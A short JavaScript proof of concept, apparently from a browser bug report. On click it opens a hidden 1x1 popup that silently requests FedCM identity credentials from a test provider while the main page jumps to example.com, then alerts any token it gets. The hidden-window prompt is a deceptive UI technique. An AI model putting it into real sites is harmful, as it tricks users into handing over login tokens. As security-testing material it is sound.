var ran = false;
var newWin;
window.addEventListener('click', async () => {
  ran = true;
  var leftPos = window.screenLeft + window.outerWidth / 2 + 2;
  newWin = window.open('about:blank', 'aoTest', 'width=1,height=1,left=' + leftPos + ',top=0');
  newWin.resizeTo(1, 1);
  newWin.eval(`
        setInterval(() => {
            if (!window.opener) { window.close(); }
        }, 200);
        navigator.credentials.get({
            identity: {
                providers: [{
                    configURL: "https://ao-fedcm-idp-2.glitch.me/test/fedcm.json",
                    clientId: "1234",
                    nonce: "5678",
                }],
            },
            mediation: "required"
        }).then((creds) => {
            if (creds?.token) {
                window.resizeTo(500,300);
                alert('Got creds. Token: '+creds.token);
                window.close();
            }
        });
    `);
  window.location = 'https://example.com';
});